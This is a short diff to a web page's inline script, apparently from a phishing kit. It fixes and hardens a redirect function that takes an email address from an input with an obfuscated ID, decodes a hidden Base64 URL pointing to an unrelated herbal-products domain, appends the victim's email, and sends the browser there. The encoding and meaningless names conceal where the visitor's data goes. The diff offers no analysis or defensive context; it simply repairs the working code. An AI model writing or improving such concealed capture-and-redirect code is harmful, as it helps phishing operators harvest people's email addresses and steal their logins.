@@ -1773,14 +1773,17 @@
         var xrxrrrrrr = document.getElementById('xrxrrrrrr-input').value;
         redirect(xrxrrrrrr);
     }
-
-    function redirect(email) {
-    var linkx = "IGh0dHBzOi8vb3JnYWhlcmJhbG5hdHVyYWxzLmNvbS9uLz9jM1k5YnpNMk5WOHhYMjV2YlNaeVlXNWtQVlZyV2xCVlZGVTlKblZwWkQxVlUwVlNNRGd3TVRJd01qVlZNamN3TVRBNE1qWT1OMDEyM05bRU1BSUxd
-";  // Base64 encoded link
-    var decodedLink = atob(linkx);  // Decode the Base64 string
-    var finalLink = decodedLink + "#" + email;  // Append the email directly to the URL
-    window.location.href = finalLink;  // Redirect to the final link
+function redirect(email) {
+    if (!email || !email.includes("@")) {
+        alert("Please enter a valid email address.");
+        return;
+    }
+    var linkx = "aHR0cHM6Ly9vcmdhaGVyYmFsbmF0dXJhbHMuY29tL24vP2MzWTliek0yTlY4eFgyNXZiU1p5WVc1a1BWVnJXbEJWVkZVOUpuVnBaRDFWVTBWU01EZ3dNVEl3TWpWVk1qY3dNVEE0TWpZPU4wMTIzTltFTUFJTF0=";
+    var decodedLink = atob(linkx);
+    var finalLink = decodedLink + "#" + email;
+    window.location.href = finalLink;
 }
+
 
 </script>
 
